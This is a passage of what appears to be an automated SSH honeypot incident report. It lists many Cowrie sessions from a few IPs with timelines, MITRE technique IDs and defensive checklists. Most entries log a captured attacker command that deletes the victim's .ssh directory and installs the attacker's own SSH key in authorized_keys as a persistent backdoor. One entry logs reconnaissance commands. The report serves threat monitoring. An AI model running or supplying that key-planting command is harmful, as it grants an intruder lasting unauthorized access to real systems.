| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 12:29:16` | `cowrie.session.connect` |
| `2026-06-02 12:29:16` | `cowrie.client.version` |
| `2026-06-02 12:29:17` | `cowrie.client.kex` |
| `2026-06-02 12:29:17` | `cowrie.login.success` |
| `2026-06-02 12:29:17` | `cowrie.session.params` |
| `2026-06-02 12:29:17` | `cowrie.command.input` |
| `2026-06-02 12:29:17` | `cowrie.command.failed` |
| `2026-06-02 12:29:17` | `cowrie.log.closed` |
| `2026-06-02 12:29:18` | `cowrie.session.params` |
| `2026-06-02 12:29:18` | `cowrie.command.input` |
| `2026-06-02 12:29:18` | `cowrie.session.file_download` |
| `2026-06-02 12:29:18` | `cowrie.log.closed` |
| `2026-06-02 12:29:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3152347d8027

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-06-02 12:29 |
| **Last Seen** | 2026-06-02 12:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 12:29:20` | `cowrie.session.connect` |
| `2026-06-02 12:29:20` | `cowrie.client.version` |
| `2026-06-02 12:29:20` | `cowrie.client.kex` |
| `2026-06-02 12:29:20` | `cowrie.login.success` |
| `2026-06-02 12:29:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4a80dad0d39

| Field | Detail |
|---|---|
| **Source IP** | `119.192.53[.]4` |
| **First Seen** | 2026-06-02 12:37 |
| **Last Seen** | 2026-06-02 12:41 |
| **Session Duration** | 212s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 12:37:44` | `cowrie.session.connect` |
| `2026-06-02 12:37:44` | `cowrie.client.version` |
| `2026-06-02 12:37:45` | `cowrie.client.kex` |
| `2026-06-02 12:37:51` | `cowrie.login.failed` |
| `2026-06-02 12:37:53` | `cowrie.login.success` |
| `2026-06-02 12:37:55` | `cowrie.session.params` |
| `2026-06-02 12:37:55` | `cowrie.command.input` |
| `2026-06-02 12:37:55` | `cowrie.command.failed` |
| `2026-06-02 12:37:56` | `cowrie.log.closed` |
| `2026-06-02 12:37:58` | `cowrie.session.params` |
| `2026-06-02 12:37:58` | `cowrie.command.input` |
| `2026-06-02 12:37:59` | `cowrie.log.closed` |
| `2026-06-02 12:38:01` | `cowrie.session.params` |
| `2026-06-02 12:38:01` | `cowrie.command.input` |
| `2026-06-02 12:38:02` | `cowrie.log.closed` |
| `2026-06-02 12:38:04` | `cowrie.session.params` |
| `2026-06-02 12:38:04` | `cowrie.command.input` |
| `2026-06-02 12:38:05` | `cowrie.log.closed` |
| `2026-06-02 12:38:08` | `cowrie.session.params` |
| `2026-06-02 12:38:08` | `cowrie.command.input` |
| `2026-06-02 12:38:09` | `cowrie.log.closed` |
| `2026-06-02 12:38:12` | `cowrie.session.params` |
| `2026-06-02 12:38:12` | `cowrie.command.input` |
| `2026-06-02 12:38:13` | `cowrie.log.closed` |
| `2026-06-02 12:38:16` | `cowrie.session.params` |
| `2026-06-02 12:38:16` | `cowrie.command.input` |
| `2026-06-02 12:38:17` | `cowrie.log.closed` |
| `2026-06-02 12:38:19` | `cowrie.session.params` |
| `2026-06-02 12:38:19` | `cowrie.command.input` |
| `2026-06-02 12:38:20` | `cowrie.log.closed` |
| `2026-06-02 12:38:23` | `cowrie.session.params` |
| `2026-06-02 12:38:23` | `cowrie.command.input` |
| `2026-06-02 12:38:24` | `cowrie.log.closed` |
| `2026-06-02 12:41:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.192.53[.]4` to AbuseIPDB if not already reported
- [ ] Block `119.192.53[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2985d6fb66b

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-06-02 12:39 |
| **Last Seen** | 2026-06-02 12:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 12:39:53` | `cowrie.session.connect` |
| `2026-06-02 12:39:53` | `cowrie.client.version` |
| `2026-06-02 12:39:53` | `cowrie.client.kex` |
| `2026-06-02 12:39:53` | `cowrie.login.success` |
| `2026-06-02 12:39:54` | `cowrie.session.params` |
| `2026-06-02 12:39:54` | `cowrie.command.input` |
| `2026-06-02 12:39:54` | `cowrie.command.failed` |
| `2026-06-02 12:39:54` | `cowrie.log.closed` |
| `2026-06-02 12:39:54` | `cowrie.session.params` |
| `2026-06-02 12:39:54` | `cowrie.command.input` |
| `2026-06-02 12:39:54` | `cowrie.session.file_download` |
| `2026-06-02 12:39:54` | `cowrie.log.closed` |
| `2026-06-02 12:39:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30cd8cb0e6e4

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-06-02 12:39 |
| **Last Seen** | 2026-06-02 12:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 12:39:56` | `cowrie.session.connect` |
| `2026-06-02 12:39:56` | `cowrie.client.version` |
| `2026-06-02 12:39:56` | `cowrie.client.kex` |
| `2026-06-02 12:39:56` | `cowrie.login.success` |
| `2026-06-02 12:39:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eca1b8ef1f3

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-06-02 13:03 |
| **Last Seen** | 2026-06-02 13:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:03:36` | `cowrie.session.connect` |
| `2026-06-02 13:03:36` | `cowrie.client.version` |
| `2026-06-02 13:03:36` | `cowrie.client.kex` |
| `2026-06-02 13:03:36` | `cowrie.login.success` |
| `2026-06-02 13:03:36` | `cowrie.session.params` |
| `2026-06-02 13:03:36` | `cowrie.command.input` |
| `2026-06-02 13:03:36` | `cowrie.command.failed` |
| `2026-06-02 13:03:37` | `cowrie.log.closed` |
| `2026-06-02 13:03:37` | `cowrie.session.params` |
| `2026-06-02 13:03:37` | `cowrie.command.input` |
| `2026-06-02 13:03:37` | `cowrie.session.file_download` |
| `2026-06-02 13:03:37` | `cowrie.log.closed` |
| `2026-06-02 13:03:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e2564710537

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-06-02 13:03 |
| **Last Seen** | 2026-06-02 13:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:03:39` | `cowrie.session.connect` |
| `2026-06-02 13:03:39` | `cowrie.client.version` |
| `2026-06-02 13:03:39` | `cowrie.client.kex` |
| `2026-06-02 13:03:39` | `cowrie.login.success` |
| `2026-06-02 13:03:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-958cc6d54f36

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-06-02 13:06 |
| **Last Seen** | 2026-06-02 13:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:06:13` | `cowrie.session.connect` |
| `2026-06-02 13:06:13` | `cowrie.client.version` |
| `2026-06-02 13:06:13` | `cowrie.client.kex` |
| `2026-06-02 13:06:14` | `cowrie.login.success` |
| `2026-06-02 13:06:14` | `cowrie.session.params` |
| `2026-06-02 13:06:14` | `cowrie.command.input` |
| `2026-06-02 13:06:14` | `cowrie.command.failed` |
| `2026-06-02 13:06:14` | `cowrie.log.closed` |
| `2026-06-02 13:06:14` | `cowrie.session.params` |
| `2026-06-02 13:06:14` | `cowrie.command.input` |
| `2026-06-02 13:06:14` | `cowrie.session.file_download` |
| `2026-06-02 13:06:14` | `cowrie.log.closed` |
| `2026-06-02 13:06:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49dd2cf930d6

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-06-02 13:06 |
| **Last Seen** | 2026-06-02 13:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:06:16` | `cowrie.session.connect` |
| `2026-06-02 13:06:16` | `cowrie.client.version` |
| `2026-06-02 13:06:16` | `cowrie.client.kex` |
| `2026-06-02 13:06:17` | `cowrie.login.success` |
| `2026-06-02 13:06:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2d4bbe30bbe

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 13:29 |
| **Last Seen** | 2026-06-02 13:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:29:12` | `cowrie.session.connect` |
| `2026-06-02 13:29:12` | `cowrie.client.version` |
| `2026-06-02 13:29:12` | `cowrie.client.kex` |
| `2026-06-02 13:29:13` | `cowrie.login.success` |
| `2026-06-02 13:29:13` | `cowrie.session.params` |
| `2026-06-02 13:29:13` | `cowrie.command.input` |
| `2026-06-02 13:29:13` | `cowrie.command.failed` |
| `2026-06-02 13:29:13` | `cowrie.log.closed` |
| `2026-06-02 13:29:13` | `cowrie.session.params` |
| `2026-06-02 13:29:13` | `cowrie.command.input` |
| `2026-06-02 13:29:13` | `cowrie.session.file_download` |
| `2026-06-02 13:29:13` | `cowrie.log.closed` |
| `2026-06-02 13:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-852f4dc41a8c

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 13:29 |
| **Last Seen** | 2026-06-02 13:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:29:15` | `cowrie.session.connect` |
| `2026-06-02 13:29:15` | `cowrie.client.version` |
| `2026-06-02 13:29:15` | `cowrie.client.kex` |
| `2026-06-02 13:29:16` | `cowrie.login.success` |
| `2026-06-02 13:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63db7da803f6

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 13:30 |
| **Last Seen** | 2026-06-02 13:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:30:56` | `cowrie.session.connect` |
| `2026-06-02 13:30:56` | `cowrie.client.version` |
| `2026-06-02 13:30:56` | `cowrie.client.kex` |
| `2026-06-02 13:30:56` | `cowrie.login.success` |
| `2026-06-02 13:30:57` | `cowrie.session.params` |
| `2026-06-02 13:30:57` | `cowrie.command.input` |
| `2026-06-02 13:30:57` | `cowrie.command.failed` |
| `2026-06-02 13:30:57` | `cowrie.log.closed` |
| `2026-06-02 13:30:57` | `cowrie.session.params` |
| `2026-06-02 13:30:57` | `cowrie.command.input` |
| `2026-06-02 13:30:57` | `cowrie.session.file_download` |
| `2026-06-02 13:30:57` | `cowrie.log.closed` |
| `2026-06-02 13:30:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b32d3f72ca1

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 13:30 |
| **Last Seen** | 2026-06-02 13:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:30:59` | `cowrie.session.connect` |
| `2026-06-02 13:30:59` | `cowrie.client.version` |
| `2026-06-02 13:30:59` | `cowrie.client.kex` |
| `2026-06-02 13:30:59` | `cowrie.login.success` |
| `2026-06-02 13:30:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f0652ff816a

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 13:36 |
| **Last Seen** | 2026-06-02 13:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:36:26` | `cowrie.session.connect` |
| `2026-06-02 13:36:26` | `cowrie.client.version` |
| `2026-06-02 13:36:26` | `cowrie.client.kex` |
| `2026-06-02 13:36:27` | `cowrie.login.success` |
| `2026-06-02 13:36:27` | `cowrie.session.params` |
| `2026-06-02 13:36:27` | `cowrie.command.input` |
| `2026-06-02 13:36:27` | `cowrie.command.failed` |
| `2026-06-02 13:36:27` | `cowrie.log.closed` |
| `2026-06-02 13:36:27` | `cowrie.session.params` |
| `2026-06-02 13:36:27` | `cowrie.command.input` |
| `2026-06-02 13:36:27` | `cowrie.session.file_download` |
| `2026-06-02 13:36:27` | `cowrie.log.closed` |
| `2026-06-02 13:36:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71b438d69bcb

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 13:36 |
| **Last Seen** | 2026-06-02 13:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:36:29` | `cowrie.session.connect` |
| `2026-06-02 13:36:29` | `cowrie.client.version` |
| `2026-06-02 13:36:29` | `cowrie.client.kex` |
| `2026-06-02 13:36:30` | `cowrie.login.success` |
| `2026-06-02 13:36:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-421a9750d6dd

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 13:44 |
| **Last Seen** | 2026-06-02 13:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:44:48` | `cowrie.session.connect` |
| `2026-06-02 13:44:48` | `cowrie.client.version` |
| `2026-06-02 13:44:48` | `cowrie.client.kex` |
| `2026-06-02 13:44:49` | `cowrie.login.success` |
| `2026-06-02 13:44:49` | `cowrie.session.params` |
| `2026-06-02 13:44:49` | `cowrie.command.input` |
| `2026-06-02 13:44:49` | `cowrie.command.failed` |
| `2026-06-02 13:44:49` | `cowrie.log.closed` |
| `2026-06-02 13:44:49` | `cowrie.session.params` |
| `2026-06-02 13:44:49` | `cowrie.command.input` |
| `2026-06-02 13:44:49` | `cowrie.session.file_download` |
| `2026-06-02 13:44:49` | `cowrie.log.closed` |
| `2026-06-02 13:44:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6be6ce27f4e2

| Field | Detail |
|---|---|
